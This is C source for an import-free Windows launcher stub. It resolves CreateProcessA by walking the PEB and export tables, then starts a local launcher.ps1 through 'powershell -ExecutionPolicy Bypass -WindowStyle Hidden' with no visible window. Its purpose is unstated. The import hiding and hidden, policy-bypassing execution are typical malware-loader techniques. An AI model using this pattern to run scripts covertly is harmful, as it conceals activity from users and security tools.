typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef long long i64;
typedef void* PTR;
typedef int BOOL;
typedef unsigned long DWORD;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef char* LPSTR;
typedef const char* LPCSTR;
typedef void* HANDLE;

typedef struct {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    BYTE* lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
} STARTUPINFOA;

typedef struct {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
} PROCESS_INFORMATION;

typedef BOOL (*CreateProcessA_t)(LPCSTR, LPSTR, PTR, PTR, BOOL, DWORD, PTR, LPCSTR, STARTUPINFOA*, PROCESS_INFORMATION*);
typedef DWORD (*GetModuleFileNameA_t)(HANDLE, LPSTR, DWORD);

typedef struct LIST_ENTRY_X {
    struct LIST_ENTRY_X* Flink;
    struct LIST_ENTRY_X* Blink;
} LIST_ENTRY_X;

typedef struct {
    u16 Length;
    u16 MaximumLength;
    u16* Buffer;
} UNICODE_STRING_X;

static void zero_mem(void* p, u64 n) {
    u8* b=(u8*)p;
    for(u64 i=0;i<n;i++) b[i]=0;
}
static int str_eq(const char* a,const char* b){
    while(*a&&*b){if(*a!=*b)return 0;a++;b++;}
    return *a==0&&*b==0;
}
static int wide_eq_ascii_ci(const u16* w,u16 bytes,const char* a){
    if(!w)return 0;
    u32 n=bytes/2, i=0;
    for(;i<n&&a[i];i++){
        u16 wc=w[i]; char ac=a[i];
        if(wc>='A'&&wc<='Z')wc=(u16)(wc+32);
        if(ac>='A'&&ac<='Z')ac=(char)(ac+32);
        if((u16)(unsigned char)ac!=wc)return 0;
    }
    return i==n&&a[i]==0;
}
static void* get_peb(void){
    void* p;
    __asm__("movq %%gs:0x60, %0":"=r"(p));
    return p;
}
static void* find_module(const char* wanted){
    u8* peb=(u8*)get_peb();
    u8* ldr=*(u8**)(peb+0x18);
    LIST_ENTRY_X* head=(LIST_ENTRY_X*)(ldr+0x20);
    LIST_ENTRY_X* cur=head->Flink;
    while(cur&&cur!=head){
        u8* entry=(u8*)cur-0x10;
        void* base=*(void**)(entry+0x30);
        UNICODE_STRING_X* name=(UNICODE_STRING_X*)(entry+0x58);
        if(wide_eq_ascii_ci(name->Buffer,name->Length,wanted))return base;
        cur=cur->Flink;
    }
    return 0;
}
static void* find_export(void* module,const char* wanted){
    if(!module)return 0;
    u8* base=(u8*)module;
    u32 peoff=*(u32*)(base+0x3c);
    u8* nt=base+peoff;
    u8* opt=nt+24;
    u32 export_rva=*(u32*)(opt+0x70);
    if(!export_rva)return 0;
    u8* exp=base+export_rva;
    u32 funcs=*(u32*)(exp+28);
    u32 names=*(u32*)(exp+32);
    u32 ords=*(u32*)(exp+36);
    u32 count=*(u32*)(exp+24);
    u32* name_arr=(u32*)(base+names);
    u16* ord_arr=(u16*)(base+ords);
    u32* fn_arr=(u32*)(base+funcs);
    for(u32 i=0;i<count;i++){
        const char* name=(const char*)(base+name_arr[i]);
        if(str_eq(name,wanted)){
            u16 ord=ord_arr[i];
            return (void*)(base+fn_arr[ord]);
        }
    }
    return 0;
}
static u64 str_len(const char* s){u64 n=0;while(s[n])n++;return n;}
static void append(char* dst,u64* pos,const char* src,u64 cap){
    while(*src&&*pos+1<cap){dst[*pos]=*src;(*pos)++;src++;}
    dst[*pos]=0;
}

static char g_exe[32768];
static char g_script[32768];
static char g_cmd[32768];

void entry(void){
    void* kb=find_module("kernelbase.dll");
    if(!kb) kb=find_module("kernel32.dll");
    CreateProcessA_t CreateProcessA=(CreateProcessA_t)find_export(kb,"CreateProcessA");
    GetModuleFileNameA_t GetModuleFileNameA=(GetModuleFileNameA_t)find_export(kb,"GetModuleFileNameA");
    if(!CreateProcessA||!GetModuleFileNameA)return;

    zero_mem(g_exe,sizeof(g_exe));
    DWORD got=GetModuleFileNameA(0,g_exe,(DWORD)(sizeof(g_exe)-1));
    if(!got||got>=sizeof(g_exe)-1)return;

    i64 slash=-1;
    for(u64 i=0;g_exe[i];i++) if(g_exe[i]=='\\'||g_exe[i]=='/') slash=(i64)i;
    if(slash<0)return;
    g_exe[slash]=0;

    zero_mem(g_script,sizeof(g_script));
    u64 sp=0; append(g_script,&sp,g_exe,sizeof(g_script)); append(g_script,&sp,"\\launcher.ps1",sizeof(g_script));

    zero_mem(g_cmd,sizeof(g_cmd));
    u64 p=0;
    append(g_cmd,&p,"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"",sizeof(g_cmd));
    append(g_cmd,&p,g_script,sizeof(g_cmd));
    append(g_cmd,&p,"\"",sizeof(g_cmd));

    STARTUPINFOA si; PROCESS_INFORMATION pi;
    zero_mem(&si,sizeof(si)); zero_mem(&pi,sizeof(pi));
    si.cb=(DWORD)sizeof(si);
    CreateProcessA(0,g_cmd,0,0,0,0x08000000,0,g_exe,&si,&pi);
}
